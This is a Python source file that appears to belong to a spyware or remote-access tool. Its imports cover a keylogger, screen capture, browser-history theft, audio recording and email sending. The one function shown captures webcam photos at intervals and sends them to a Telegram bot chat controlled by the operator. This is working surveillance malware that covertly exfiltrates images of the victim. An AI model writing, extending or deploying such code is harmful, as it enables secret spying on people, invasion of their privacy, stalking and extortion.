
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

import telepot
def get(botObj:telepot.Bot, chat_id, number=10, gap=3, path=os.path.join(".","output","webcam")):
    """
    Captures webcam pictures every five seconds.

    :param webcam_path:  The file path where the webcam pictures will be stored.
    :return:  Nothing
    """
    # Create directory for webcam picture storage #
    Path(path).mkdir(parents=True, exist_ok=True)

    if (botObj is not None):
        botObj.sendMessage(chat_id, "Take picture by webcam for every %s second(s). Total %s picture(s)"%(gap, number))

    # Initialize video capture instance #
    cam = cv2.VideoCapture(0)

    for current in range(1, number):
        # Take picture of current webcam view #
        ret, img = cam.read()
        # If image was captured #
        if ret:
            # Format output webcam path #
            file_path = os.path.join(path, f'{current}_webcam.jpg')
            # Save the image to as file #
            cv2.imwrite(str(file_path), img)

        # Sleep process 5 seconds #
        time.sleep(gap)

    # Release camera control #
    cam.release()

    if (botObj is not None):
        media = []
        for file in os.listdir(path):
            if file.endswith(".jpg"):
                f =open(os.path.join(path, file), 'rb')
                media.append({"type": "photo", "media": f})
        botObj.sendMediaGroup(chat_id, media)